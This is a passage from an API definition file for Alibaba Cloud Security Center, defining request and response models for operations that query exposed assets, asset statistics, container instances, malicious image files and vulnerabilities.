  gatewayAssetCount?: int32(name='GatewayAssetCount', description='The total number of gateway assets that are exposed on the Internet. The gateway assets include NAT gateways and Server Load Balancer (SLB) instances.', example='3'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='4B897D10-B3CD-4A93-A5FA-591F3ED12A86'),
}

model DescribeExposedStatisticsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeExposedStatisticsResponseBody(name='body'),
}

async function describeExposedStatistics(request: DescribeExposedStatisticsRequest): DescribeExposedStatisticsResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeExposedStatistics', 'POST', '/', 'json', false, 'json', request);
}

model DescribeExposedStatisticsDetailRequest {
  currentPage?: int32(name='CurrentPage', description='The number of the page to return.', example='1', position='Query'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: 20. If you leave this parameter empty, 20 entries are returned on each page.

>  We recommend that you do not leave this parameter empty.', example='20', position='Query'),
  statisticsType: string(name='StatisticsType', description='The type of the exposed asset. Valid values:

*   **exposureType**: gateway assets
*   **exposurePort**: ports
*   **exposureComponent**: system components
*   **exposureIp**: IP addresses', example='exposureType', position='Query'),
  statisticsTypeGatewayType?: string(name='StatisticsTypeGatewayType', description='The type of the gateway asset. This parameter is required when the **StatisticsType** parameter is set to **exposureType**. Valid values:

*   **SLB**: the public IP address of a Server Load Balancer (SLB) instance
*   **DNAT**: the NAT gateway that connects to the Internet by using the DNAT feature', example='SLB', position='Query'),
  statisticsTypeInstanceValue?: string(name='StatisticsTypeInstanceValue', description='The ID of the gateway asset. This parameter is required when the **StatisticsType** parameter is set to **exposureType**.', example='lb-2ze4rso39h4nczcqs****', position='Query'),
}

model DescribeExposedStatisticsDetailResponseBody = {
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='2'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='2'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='7CBAFB3F-1ED7-4A23-986A-6F67F0466BD1'),
  statisticsDetails?: [ 
    {
      exposedCount?: int32(name='ExposedCount', description='The total number of system vulnerabilities that are detected on your server and are exposed on the Internet.', example='0'),
      exposureComponent?: string(name='ExposureComponent', description='The system component that is exposed on the Internet.', example='tomcat'),
      exposureIp?: string(name='ExposureIp', description='The public IP address that is exposed on the Internet.', example='123.57.XX.XX'),
      exposurePort?: string(name='ExposurePort', description='The port that is exposed on the Internet.', example='22'),
      exposureType?: string(name='ExposureType', description='The resource from which the asset is exposed. Valid values:

*   **INTERNET_IP**: the IP address of the Elastic Compute Service (ECS) instance
*   **SLB**: the public IP address of the SLB instance
*   **EIP**: the elastic IP address (EIP)
*   **DNAT**: the NAT gateway that connects to the Internet by using the DNAT feature', example='SLB'),
      exposureTypeId?: string(name='ExposureTypeId', description='The ID of the instance to which the resource belongs. The valid values of this parameter vary based on the value of the ExposureType parameter.

*   If the value of the **ExposureType** parameter is **INTERNET_IP**, the value of this parameter is an empty string.
*   If the value of the **ExposureType** parameter is **SLB**, the value of this parameter is the ID of the Internet-facing SLB instance.
*   If the value of the **ExposureType** parameter is **EIP**, the value of this parameter is the ID of the EIP.
*   If the value of the **ExposureType** parameter is **DNAT**, the value of this parameter is the ID of the NAT gateway.', example='lb-2ze4rso39h4nczcqs****'),
      exposureTypeInstanceName?: string(name='ExposureTypeInstanceName', description='The name of the gateway asset that is exposed on the Internet.', example='ngw-bp1vkbju8f3w87c9v****'),
      regionId?: string(name='RegionId', description='The region ID of the asset.', example='cn-hangzhou'),
    }
  ](name='StatisticsDetails', description='An array consisting of the gateway assets, ports, system components, or public IP addresses that are exposed on the Internet and are returned.'),
}

model DescribeExposedStatisticsDetailResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeExposedStatisticsDetailResponseBody(name='body'),
}

async function describeExposedStatisticsDetail(request: DescribeExposedStatisticsDetailRequest): DescribeExposedStatisticsDetailResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeExposedStatisticsDetail', 'POST', '/', 'json', false, 'json', request);
}

model DescribeFieldStatisticsRequest {
  machineTypes?: string(name='MachineTypes', description='The type of the asset to query. If no asset types are specified, all types of assets are returned. Valid values:

*   **ecs**: server
*   **cloud_product**: Alibaba Cloud service', example='ecs', position='Query'),
  regionId?: string(name='RegionId', description='The ID of the region in which the asset resides.', example='cn-hangzhou', position='Query'),
  resourceDirectoryAccountId?: long(name='ResourceDirectoryAccountId', description='The ID of the primary account of the Resource Directory member account.
> call the [DescribeMonitorAccounts](~~DescribeMonitorAccounts~~) interface to obtain this parameter.', example='1232428423234****', position='Query'),
}

model DescribeFieldStatisticsResponseBody = {
  groupedFields?: {
    aliYunInstanceCount?: int32(name='AliYunInstanceCount', description='The number of assets that are deployed on Alibaba Cloud.', example='100'),
    awsInstanceCount?: int32(name='AwsInstanceCount', description='The number of servers.', example='100'),
    azureInstanceCount?: int32(name='AzureInstanceCount', description='The number of third-party cloud servers.', example='5'),
    exposedInstanceCount?: int32(name='ExposedInstanceCount', description='The number of exposed servers.', example='1'),
    generalAssetCount?: int32(name='GeneralAssetCount', description='The number of assets whose importance is common.', example='10'),
    groupCount?: int32(name='GroupCount', description='The number of server groups.', example='20'),
    huaweiInstanceCount?: int32(name='HuaweiInstanceCount', description='The number of instances that are provisioned by third-party providers.', example='0'),
    idcInstanceCount?: int32(name='IdcInstanceCount', description='The number of assets that can be protected by Security Center.', example='100'),
    importantAssetCount?: int32(name='ImportantAssetCount', description='The number of assets whose importance is important.', example='10'),
    instanceCount?: int32(name='InstanceCount', description='The total number of assets of the specified type. If no asset types are specified, this parameter indicates the total number of all servers and Alibaba Cloud services within your account.', example='100'),
    instanceSyncTaskCount?: int32(name='InstanceSyncTaskCount', description='The total number of tasks for the specified type of assets. If no asset types are specified, this parameter indicates the total number of all servers and Alibaba Cloud services within your account.', example='10'),
    newInstanceCount?: int32(name='NewInstanceCount', description='The number of newly added servers.', example='10'),
    noRiskInstanceCount?: int32(name='NoRiskInstanceCount', description='The number of servers on which no risks are detected.', example='10'),
    notRunningStatusCount?: int32(name='NotRunningStatusCount', description='The number of servers that are shut down.', example='10'),
    offlineInstanceCount?: int32(name='OfflineInstanceCount', description='The number of servers whose Security Center agent status is Offline.', example='21'),
    outMachineInstanceCount?: int32(name='OutMachineInstanceCount', description='The number of servers outside the cloud.', example='20'),
    pauseInstanceCount?: int32(name='PauseInstanceCount', description='The number of servers for which the Security Center agent suspends protection.', example='10'),
    regionCount?: int32(name='RegionCount', description='The number of regions to which the servers belong.', example='11'),
    riskInstanceCount?: int32(name='RiskInstanceCount', description='The number of assets that are at risk.', example='90'),
    tencentInstanceCount?: int32(name='TencentInstanceCount', description='The total number of cloud services that are protected by Security Center.', example='10'),
    testAssetCount?: int32(name='TestAssetCount', description='The number of assets whose importance is test.', example='10'),
    tripartiteInstanceCount?: int32(name='TripartiteInstanceCount', description='The number of simple application servers.', example='2'),
    unKnowStatusInstanceCount?: int32(name='UnKnowStatusInstanceCount', description='The number of servers that are in the Unknown state.', example='1'),
    unprotectedInstanceCount?: int32(name='UnprotectedInstanceCount', description='The number of unprotected assets.', example='10'),
    vpcCount?: int32(name='VpcCount', description='The number of virtual private clouds (VPCs).', example='5'),
  }(name='GroupedFields', description='The information about servers that are returned.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='7E0618A9-D5EF-4220-9471-C42B5E92719F'),
}

model DescribeFieldStatisticsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeFieldStatisticsResponseBody(name='body'),
}

async function describeFieldStatistics(request: DescribeFieldStatisticsRequest): DescribeFieldStatisticsResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeFieldStatistics', 'POST', '/', 'json', false, 'json', request);
}

model DescribeFrontVulPatchListRequest {
  info: string(name='Info', description='The information about the Windows system vulnerability. The value is a JSON string that contains the following fields:

*   **name**: the name of the vulnerability.
*   **uuid**: the UUID of the server on which the vulnerability is detected.
*   **tag**: the tag that is added to the vulnerability. Set this field to **system**, which indicates Windows system vulnerabilities.', example='[{"name":"5000803","uuid":"026c9296-1234-5678-b937-a7d81f05****","tag":"system"}]', position='Query'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh', position='Query'),
  operateType: string(name='OperateType', description='The operation that you want to perform on the vulnerability. Set the value to **vul_fix**, which indicates vulnerability fixing.', example='vul_fix', position='Query'),
  type: string(name='Type', description='The type of the vulnerability. Set the value to **sys**, which indicates Windows system vulnerabilities.', example='sys', position='Query'),
}

model DescribeFrontVulPatchListResponseBody = {
  frontPatchList?: [ 
    {
      patchList?: [ 
        {
          aliasName?: string(name='AliasName', description='The name of the vulnerability.', example='RHBA-2019:2599: krb5 bug fix update'),
          name?: string(name='Name', description='The version number of the pre-patch that is required to fix the Windows system vulnerability.', example='4523204'),
        }
      ](name='PatchList', description='An array consisting of the pre-patches that are required to fix the specified Windows system vulnerability on the server.'),
      uuid?: string(name='Uuid', description='The UUID of the server.', example='1587bedb-fdb4-48c4-9330-4545****'),
    }
  ](name='FrontPatchList', description='An array consisting of the information about the pre-patches that are required to fix the specified Windows system vulnerability.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='F929E952-EBFC-56C3-BD35-BF8B59024C68'),
}

model DescribeFrontVulPatchListResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeFrontVulPatchListResponseBody(name='body'),
}

async function describeFrontVulPatchList(request: DescribeFrontVulPatchListRequest): DescribeFrontVulPatchListResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeFrontVulPatchList', 'POST', '/', 'json', false, 'json', request);
}

model DescribeGroupStructRequest {
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh', position='Query'),
}

model DescribeGroupStructResponseBody = {
  groupFather?: int32(name='GroupFather', description='The parent node of the group.', example='958****'),
  groupFlag?: int32(name='GroupFlag', description='The type of the server group. Valid values:

*   **0**: the default group
*   **1**: other groups', example='0'),
  groupId?: long(name='GroupId', description='The ID of the server group.', example='958****'),
  groupIndex?: int32(name='GroupIndex', description='The sequence number.', example='1'),
  groupLevel?: int32(name='GroupLevel', description='The level of the application group.', example='2'),
  groupName?: string(name='GroupName', description='The name of the server group.', example='TestGroupName'),
  groups?: [ string ](name='Groups', description='An array that consists of child groups.'),
  machineNum?: int32(name='MachineNum', description='The number of servers in the group.', example='30'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='9FBC6E47-7508-58C9-9E76-528E118C****'),
}

model DescribeGroupStructResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeGroupStructResponseBody(name='body'),
}

async function describeGroupStruct(request: DescribeGroupStructRequest): DescribeGroupStructResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeGroupStruct', 'POST', '/', 'json', false, 'json', request);
}

model DescribeGroupedContainerInstancesRequest {
  criteria?: string(name='Criteria', description='The search conditions for assets. Specify the value in the JSON format. Separate multiple search conditions with commas (,). Example: `[{"name":"riskStatus","value":"YES"},{"name":"riskLevel","value":"2"}]`.

>  Supported search conditions include the instance ID, instance name, virtual private cloud (VPC) ID, region, and public IP address. You can call the [DescribeCriteria](~~DescribeCriteria~~) operation to query the supported search conditions.', example='[{"name":"riskStatus","value":"YES"},{"name":"riskLevel","value":"2"}]', position='Query'),
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Default value: **1**.', example='1', position='Query'),
  fieldValue?: string(name='FieldValue', description='The keyword that you want to use to query containers. You must specify this parameter based on the value of the GroupField parameter.

*   If the **GroupField** parameter is set to **pod**, set this parameter to the name of the pod that you want to query.
*   If the **GroupField** parameter is set to **appName**, set this parameter to the name of the application that you want to query.
*   If the **GroupField** parameter is set to **namespace**, set this parameter to the namespace that you want to query.
*   If the **GroupField** parameter is set to **clusterId**, set this parameter to the ID of the cluster that you want to query.

>  Fuzzy match is supported.', example='cas-adad-qeqwe', position='Query'),
  groupField: string(name='GroupField', description='The group type that you want to use to query containers. Valid values:

*   **pod**
*   **appName**
*   **namespace**
*   **clusterId**', example='pod', position='Query'),
  logicalExp?: string(name='LogicalExp', description='The logical relationship that you want to use to evaluate multiple search conditions. Valid values:

*   **OR**: Search conditions are evaluated by using a logical **OR**.
*   **AND**: Search conditions are evaluated by using a logical **AND**.', example='OR', position='Query'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: **20**.

>  We recommend that you do not leave this parameter empty.', example='20', position='Query'),
}

model DescribeGroupedContainerInstancesResponseBody = {
  groupedContainerInstanceList?: [ 
    {
      alarmCount?: int32(name='AlarmCount', description='The number of alerts that are detected from the current pod, application, namespace, or cluster.', example='1'),
      appName?: string(name='AppName', description='The application name.', example='oss-liveness-probe'),
      clusterId?: string(name='ClusterId', description='The cluster ID.', example='cf3824769c85441b4bf3****'),
      clusterName?: string(name='ClusterName', description='The name of the cluster.', example='test'),
      clusterType?: string(name='ClusterType', description='The type of the cluster. Valid values:

*   **Kubernetes**: dedicated Kubernetes cluster.
*   **ManagedKubernetes**: standard managed cluster (edge cluster).
*   **Ask**: standard serverless cluster.', example='ManagedKubernetes'),
      createTime?: long(name='CreateTime', description='The timestamp generated when the cluster was created. Unit: milliseconds.', example='1600076893000'),
      custerState?: string(name='CusterState', description='The status of the cluster. Valid values:

*   **running**: The cluster is running.
*   **stopped**: The cluster is stopped.
*   **deleted**: The cluster is deleted.
*   **delete_failed**: The cluster fails to be deleted.
*   **failed**: The cluster fails to be created.', example='running'),
      hcCount?: int32(name='HcCount', description='The number of baseline risks that are detected on the current pod, application, namespace, or cluster.', example='20'),
      hostIp?: string(name='HostIp', description='The IP address of the host in the container cluster.', example='172.114.XX.XX'),
      image?: string(name='Image', description='The image of the container.', example='registry-vpc.ap-southeast-5.aliyuncs.com/log-service-release/sls-connector:1.1.77'),
      imageDigest?: string(name='ImageDigest', description='The digest value of the image.', example='58e58c013f70bbfde140c8a55c1078074b3483479428d4069aa946827fd566cf'),
      imageRepoName?: string(name='ImageRepoName', description='The name of the image repository.', example='test-003'),
      imageRepoNamespace?: string(name='ImageRepoNamespace', description='The namespace of the image repository.', example='name001'),
      imageRepoTag?: string(name='ImageRepoTag', description='The tag that is added to the image repository.', example='dev-20220512-2'),
      imageUuid?: string(name='ImageUuid', description='The UUID of the image.', example='e4bdec1d9ba7e0967111a7ea467c****'),
      instanceCount?: int32(name='InstanceCount', description='The number of pods, applications, clusters, or namespaces that is returned.', example='9'),
      instanceId?: string(name='InstanceId', description='The ID of the server instance.', example='i-8vb9ul5xec4tua4q****'),
      namespace?: string(name='Namespace', description='The namespace of the cluster.', example='kube-system'),
      pod?: string(name='Pod', description='The name of the pod.', example='csi-plugin-2n****'),
      podIp?: string(name='PodIp', description='The IP address of the pod.', example='172.114.XX.XX'),
      regionId?: string(name='RegionId', description='The ID of the region in which the instance resides.', example='cn-hangzhou'),
      riskInstanceCount?: int32(name='RiskInstanceCount', description='The number of potential risky instances.', example='1'),
      riskLevel?: string(name='RiskLevel', description='The risk level. Valid values:

*   **high**
*   **medium**
*   **low**', example='low'),
      riskStatus?: string(name='RiskStatus', description='Indicates whether risks were detected. Valid values:

*   **NO**: No risks were detected.
*   **YES**: Risks were detected.', example='NO'),
      vulCount?: int32(name='VulCount', description='The number of vulnerabilities that are detected from the current pod, application, namespace, or cluster.', example='1'),
    }
  ](name='GroupedContainerInstanceList', description='An array that consists of the container assets returned.'),
  pageInfo?: {
    count?: int32(name='Count', description='The number of container assets returned on the current page.', example='20'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page. Default value: **20**.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of container assets returned.', example='25'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='4E5BFDCF-B9DD-430D-9DA4-151BCB581C9D'),
}

model DescribeGroupedContainerInstancesResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeGroupedContainerInstancesResponseBody(name='body'),
}

async function describeGroupedContainerInstances(request: DescribeGroupedContainerInstancesRequest): DescribeGroupedContainerInstancesResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeGroupedContainerInstances', 'POST', '/', 'json', false, 'json', request);
}

model DescribeGroupedInstancesRequest {
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Default value: **1**.', example='1', position='Query'),
  fieldValue?: string(name='FieldValue', description='The name of the group to which the assets belong. Fuzzy search is supported.', example='test-01', position='Query'),
  groupField: string(name='GroupField', description='The filter condition that you want to use to query the assets. Valid values:

*   **groupId**: the group to which the assets belong
*   **regionId**: the region in which the assets reside
*   **vpcInstanceId**: the virtual private cloud (VPC) in which the assets reside', example='groupId', position='Query'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh', position='Query'),
  machineTypes?: string(name='MachineTypes', description='The type of the assets that you want to query. Set the value to **ecs**, which indicates Elastic Compute Service (ECS) instances.', example='ecs', position='Query'),
  noPage?: boolean(name='NoPage', description='Specifies whether to enable paged query. Default value: **true**. Valid values:

*   **true**: yes
*   **false**: no', example='true', position='Query'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: **20**.', example='20', position='Query'),
  saleVersionCheckCode?: string(name='SaleVersionCheckCode', description='The edition of Security Center that protects the asset. Valid values:

* **sas_gte_advanced**: the Advanced edition or higher
* **sas_gte_enterprise**: the Enterprise edition or higher
* **sas_gt_basic:** a paid edition
* **sas_eq_advanced:** the Advanced edition
* **sas_gt_anti_virus:** an edition higher than the Anti-virus edition', example='sas_gt_basic', position='Query'),
  vendor?: int32(name='Vendor', description='The source of the server. Valid values:

*   **0**: an asset provided by Alibaba Cloud.
*   **1**: a third-party cloud server
*   **2**: a server in a data center
*   **3**, **4**, **5**, and **7**: other cloud asset
*   **8**: a lightweight asset', example='0', position='Query'),
  vendors?: string(name='Vendors', description='The source of the server. Separate multiple sources with commas (,).Valid values:

*   **0**: an asset provided by Alibaba Cloud.
*   **1**: a third-party cloud server
*   **2**: a server in a data center
*   **3**, **4**, **5**, and **7**: other cloud asset
*   **8**: a lightweight asset', example='0,8', position='Query'),
}

model DescribeGroupedInstancesResponseBody = {
  instances?: [ 
    {
      asapVulInstanceCount?: long(name='AsapVulInstanceCount', description='The number of assets on which high-risk vulnerabilities are detected.', example='11'),
      authVersionCheckCount?: int32(name='AuthVersionCheckCount', description='The number of assets that are protected by the specified edition.', example='205'),
      fieldAliasName?: string(name='FieldAliasName', description='The name of the server group.', example='testA'),
      groupFlag?: int32(name='GroupFlag', description='The type of the server group. Valid values:

*   **0**: the default group
*   **1**: other group', example='1'),
      instanceCount?: string(name='InstanceCount', description='The total number of assets that belong to the specified type.

>  If the **MachineTypes** request parameter is not specified, the value of the InstanceCount parameter is the total number of your assets.', example='205'),
      os?: string(name='Os', description='The operating system type of the asset. Valid values:

* **windows**
* **linux**

> This parameter is returned only when Lang is set to zh.', example='windows'),
      riskInstanceCount?: string(name='RiskInstanceCount', description='The number of assets that are at risk.', example='172'),
      unProtectedInstanceCount?: string(name='UnProtectedInstanceCount', description='The number of assets that are not protected by Security Center.', example='32'),
    }
  ](name='Instances', description='An array that consists of the information about the assets.'),
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='20'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='5'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page. Default value: **20**.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='100'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='52A3AEE6-114A-499D-8990-4BA9B27FE0AA'),
}

model DescribeGroupedInstancesResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeGroupedInstancesResponseBody(name='body'),
}

async function describeGroupedInstances(request: DescribeGroupedInstancesRequest): DescribeGroupedInstancesResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeGroupedInstances', 'POST', '/', 'json', false, 'json', request);
}

model DescribeGroupedMaliciousFilesRequest {
  clusterId?: string(name='ClusterId', description='The cluster ID of the container on which the malicious image sample is detected.', example='c556c8133b5ad4378b7fc533ddbda****', position='Query'),
  currentPage: int32(name='CurrentPage', description='The number of the page to return. Pages start from page **1**. Default value: **1**.', example='1', position='Query'),
  fuzzyMaliciousName?: string(name='FuzzyMaliciousName', description='The name of the malicious image sample that you want to query.

>  Fuzzy match is supported.', example='Mining', position='Query'),
  imageDigest?: string(name='ImageDigest', description='The image digest.', example='6a5e103187b31a94592a47a5858617f7****', position='Query'),
  imageLayer?: string(name='ImageLayer', description='The image layer.', example='27213ad375b53628dd152a5ca****', position='Query'),
  imageTag?: string(name='ImageTag', description='The image tag.', example='0.2', position='Query'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh', position='Query'),
  levels?: string(name='Levels', description='The severity of the malicious image sample that you want to query. You can enter multiple severities. Separate the severities with commas (,). Valid values:

*   **serious**
*   **suspicious**
*   **remind**', example='serious', position='Query'),
  maliciousMd5?: string(name='MaliciousMd5', description='The MD5 hash value of the malicious image sample.', example='d836968041f7683b5459****', position='Query'),
  pageSize: string(name='PageSize', description='The number of entries to return on each page. Default value: **20**.', example='20', position='Query'),
  repoId?: string(name='RepoId', description='The ID of the image repository.

>  You can call the [ListRepository](~~145293~~) operation to query the IDs of image repositories from the value of the **RepoId** response parameter.', example='crr-vridcl4****', position='Query'),
  repoInstanceId?: string(name='RepoInstanceId', description='The ID of the container image.

>  You can call the [ListRepository](~~145293~~) operation to query the IDs of container images from the value of the **InstanceId** response parameter.', example='cri-datvailb****', position='Query'),
  repoName?: string(name='RepoName', description='The name of the image repository.

>  Fuzzy match is supported.', example='centos', position='Query'),
  repoNamespace?: string(name='RepoNamespace', description='The namespace to which the image repository belongs.

>  Fuzzy match is supported.', example='hanghai-namespace', position='Query'),
  repoRegionId?: string(name='RepoRegionId', description='The region ID of the image repository. Valid values:

*   **cn-beijing**: China (Beijing)
*   **cn-zhangjiakou**: China (Zhangjiakou)
*   **cn-hangzhou**: China (Hangzhou)
*   **cn-shanghai**: China (Shanghai)
*   **cn-shenzhen**: China (Shenzhen)
*   **cn-hongkong**: China (Hong Kong)
*   **ap-southeast-1**: Singapore
*   **ap-southeast-5**: Indonesia (Jakarta)
*   **us-east-1**: US (Virginia)
*   **us-west-1**: US (Silicon Valley)
*   **eu-central-1**: Germany (Frankfurt)
*   **eu-west-1**: UK (London)
*   **ap-south-1**: India (Mumbai)', example='cn-shanghai', position='Query'),
  scanRange?: [ string ](name='ScanRange', description='The types of the assets that you want to scan.', position='Query'),
}

model DescribeGroupedMaliciousFilesResponseBody = {
  groupedMaliciousFileResponse?: [ 
    {
      firstScanTimestamp?: long(name='FirstScanTimestamp', description='The timestamp when the first scan was performed. Unit: milliseconds.', example='1594907349000'),
      imageCount?: long(name='ImageCount', description='The number of affected images.', example='3'),
      latestScanTimestamp?: long(name='LatestScanTimestamp', description='The timestamp when the last scan was performed. Unit: milliseconds.', example='1596533942000'),
      level?: string(name='Level', description='The severity of the malicious image sample. Valid values:

*   **serious**
*   **suspicious**
*   **remind**', example='serious'),
      maliciousKey?: string(name='MaliciousKey'),
      maliciousMd5?: string(name='MaliciousMd5', description='The MD5 hash value of the malicious image sample.', example='d836968041f7683b5459****'),
      maliciousName?: string(name='MaliciousName', description='The name of the malicious image sample.', example='testFile'),
      status?: int32(name='Status', description='The handling status of the malicious image sample. Valid values:

*   **0**: unhandled
*   **1**: handled
*   **2**: verifying
*   **3**: added to the whitelist', example='0'),
    }
  ](name='GroupedMaliciousFileResponse', description='The severity of the malicious image sample. Valid values:

*   **serious**
*   **suspicious**
*   **remind**'),
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='2'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page. Default value: **20**.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='2'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='8045E03E-6D91-4C53-9F22-5A1B84BB29D9'),
}

model DescribeGroupedMaliciousFilesResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeGroupedMaliciousFilesResponseBody(name='body'),
}

async function describeGroupedMaliciousFiles(request: DescribeGroupedMaliciousFilesRequest): DescribeGroupedMaliciousFilesResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeGroupedMaliciousFiles', 'POST', '/', 'json', false, 'json', request);
}

model DescribeGroupedTagsRequest {
  machineTypes?: string(name='MachineTypes', description='The type of the asset to query. If you do not specify this parameter, the tags of all asset types are queried. Valid values:

*   **ecs**: server
*   **cloud_product**: Alibaba Cloud service', example='ecs', position='Query'),
}

model DescribeGroupedTagsResponseBody = {
  count?: int32(name='Count', description='This parameter is deprecated.', example='0'),
  groupedFileds?: [ 
    {
      count?: string(name='Count', description='The number of assets to which the tag is added.', example='152'),
      name?: string(name='Name', description='The name of the tag.', example='InternetIp'),
      tagId?: int32(name='TagId', description='The ID of the tag.', example='3252366'),
    }
  ](name='GroupedFileds', description='An array that consists of the statistics of the asset tags.'),
  httpStatusCode?: int32(name='HttpStatusCode', description='The HTTP status code of the request.', example='200'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='151F6EB6-D5F3-417A-AF7B-4D84975DB586'),
  success?: boolean(name='Success', description='Indicates whether the request is successful. Valid values:

*   **true**: The request is successful.
*   **false**: The request fails.', example='true'),
}

model DescribeGroupedTagsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeGroupedTagsResponseBody(name='body'),
}

async function describeGroupedTags(request: DescribeGroupedTagsRequest): DescribeGroupedTagsResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeGroupedTags', 'POST', '/', 'json', false, 'json', request);
}

model DescribeGroupedVulRequest {
  aliasName?: string(name='AliasName', description='The alias of the vulnerability.', example='RHSA-2019:0230-Important: polkit security update', position='Query'),
  assetType?: string(name='AssetType', description='The type of the asset on which the vulnerability is detected. Separate multiple types with commas (,). Valid values:

*   **ECS**: Elastic Compute Service (ECS) instance
*   **CONTAINER**: container', example='ECS,CONTAINER', position='Query'),
  attachTypes?: string(name='AttachTypes', description='The type of the vulnerability. This parameter is valid only for application vulnerabilities. Separate multiple values with commas (,). Valid values:

*   **sca**: vulnerability that is detected based on software component analysis
*   **app**: application vulnerability', example='sca', position='Query'),
  containerFieldName?: string(name='ContainerFieldName', description='The key of the condition that is used to query containers. Valid values:

*   **instanceId**: the ID of the asset
*   **appName**: the name of the application
*   **clusterId**: the ID of the cluster
*   **regionId**: the ID of the region
*   **nodeName**: the name of the node
*   **namespace**: the namespace
*   **clusterName**: the name of the cluster
*   **image**: the name of the image
*   **imageRepoName**: the name of the image repository
*   **imageRepoNamespace**: the namespace to which the image repository belongs
*   **imageRepoTag**: the tag that is added to the image
*   **imageDigest**: the digest of the image', example='appName', position='Query'),
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Default value: **1**.', example='1', position='Query'),
  dealed?: string(name='Dealed', description='Specifies whether the vulnerability is handled. Valid values:

**y**: yes **n**: no', example='n', position='Query'),
  groupId?: string(name='GroupId', description='The ID of the asset group.', example='235454', position='Query'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh', position='Query'),
  necessity?: string(name='Necessity', description='The priorities to fix the vulnerabilities. Separate multiple priorities with commas (,). Valid values:

*   **asap**: high
*   **later**: medium
*   **nntf**: low', example='asap,later,nntf', position='Query'),
  pageSize?: int32(name='PageSize', description='The number of entries per page. Default value: 10.', example='20', position='Query'),
  resourceDirectoryAccountId?: long(name='ResourceDirectoryAccountId', description='The Alibaba Cloud account ID of the member in the resource directory.

>  You can call the [DescribeMonitorAccounts](~~DescribeMonitorAccounts~~) operation to obtain the IDs.', example='127608589417****', position='Query'),
  searchTags?: string(name='SearchTags', description='The tag that is used to filter vulnerabilities. Valid values:

*   Restart required
*   Remote utilization
*   EXP exists
*   Available
*   Elevation of Privilege
*   Code Execution', example='Code Execution', position='Query'),
  targetType?: string(name='TargetType', description='The query type for containers. Valid values:

*   **containerId**: the ID of the container
*   **uuid**: the ID of the asset', example='containerId', position='Query'),
  type?: string(name='Type', description='The type of the vulnerability that you want to query. Default value: cve. Valid values:

*   **cve**: Linux software vulnerability
*   **sys**: Windows system vulnerability
*   **cms**: Web-CMS vulnerability
*   **app**: application vulnerability
*   **emg**: urgent vulnerability', example='cve', position='Query'),
